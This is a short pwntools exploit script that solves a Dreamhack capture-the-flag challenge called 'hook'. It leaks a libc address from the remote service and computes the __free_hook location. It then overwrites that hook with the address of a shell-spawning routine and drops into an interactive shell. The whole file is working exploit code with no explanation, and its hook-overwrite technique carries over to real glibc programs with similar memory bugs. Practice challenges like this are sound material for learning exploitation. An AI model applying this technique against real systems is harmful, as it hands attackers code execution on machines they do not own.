from pwn import *

context.update(log_level = 'debug')
p = remote('host1.dreamhack.games', 19264)
#p = process('hook')
libc = ELF('libc.so.6')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

offset_stdout = libc.symbols['_IO_2_1_stdout_']
offset_freeHook = libc.symbols['__free_hook']
addr_libc_stdout = int(p.recvline().replace('\n', '').split(': ')[1], 16)
addr_libc_base = addr_libc_stdout - offset_stdout

log.info('offset_freeHook: ' + hex(offset_freeHook))
log.info('addr_libc_stdout: ' + hex(addr_libc_stdout))
log.info('addr_libc_base: ' + hex(addr_libc_base))

addr_libc_freeHook = addr_libc_base + offset_freeHook
addr_heap = 0x602260
#raw_input('debug: ' + str(p.pid))
p.sendlineafter(': ', '50')
addr_shell = 0x400a11
#addr_main = 0x40094a
p.sendlineafter(': ', p64(addr_libc_freeHook) + p64(addr_shell))
p.interactive()


